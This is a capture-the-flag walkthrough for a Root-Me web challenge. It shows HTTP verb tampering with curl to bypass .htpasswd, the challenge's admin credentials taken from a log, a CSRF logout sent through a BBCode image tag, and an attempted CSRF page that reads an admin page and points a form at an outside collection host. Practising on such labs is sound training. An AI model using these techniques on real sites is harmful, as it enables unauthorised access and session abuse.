There is a lot to read in the news section of the website. (even if it is, sadly, in french)

```
18/08/2011 01:00:45 Creation d'une page de contact (avec du BBCode).
```
 informs us that we can contact the administrator, and that the contact form allows BBCode (so we will be able to send a link to an image (or do a CSRF attack)).

```
22/08/2011 22:00:30 Ajout d'un systeme de journalisation d'événements pour l'admin.
```

explains that the admin created a log file.

Let's look for it: http://challenge01.root-me.org/realiste/ch7/log

Then http://challenge01.root-me.org/realiste/ch7/log/log.php

Unfortunately, the page is protected by a .htpasswd. But we learned how to bypass the with http verb tampering ! Just use

```
curl -X OPTIONS http://challenge01.root-me.org/realiste/ch7/log/log.php
```

```
------------------------ Log ---------------------
    login=toto / password=titi / no such user
    login=toto / password=toto / no such user
    login=toto / password=tutu / no such user
    login=administrateur / password=4Dm1N_de_ste / Password rejected for administrateur
    login=administrateur / password=4Dm1N_de_site / Accepted password for administrateur
    --------------------------------------------------
```

We can now try to log as an admin ! But we find this error: **Erreur : user already logged in !**.
Our task will be to disconnect the admin! We are going to use a CSRF to do this. To disconnect, a URL is used:
http://challenge01.root-me.org/realiste/ch7/hackers.php?page=deconnect

Well, we just put this address into a BBCode
```
	  [img]http://challenge01.root-me.org/realiste/ch7/hackers.php?page=deconnect[/img]
```
The admin get disconnected, we can log in and get access to the exploit page!



Note: I tried a CSRF attack by redirecting the admin to a page like this:

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Trying stuff</title>
  </head>
  <body onload="">
    <script>
      alert('issou')
      url = "http://challenge01.root-me.org/realiste/ch7/hackers.php?page=exploits";
      xmlhttp=new XMLHttpRequest();
      xmlhttp.open('GET', url, true);
      xmlhttp.onreadystatechange=function(){
        alert(xmlhttp.responseText);
      };
      xmlhttp.send(null);
    </script>
<form action="https://ayaya.free.beeceptor.com/" name="formus"><input name="name1" value="foo"><input name="filed2" value"S E X E"></form>
  </body>
</html>
```

But the site is protected against CSRF and we get the following result:

```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://challenge01.root-me.org/realiste/ch7/hackers.php?page=exploits. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing).
```
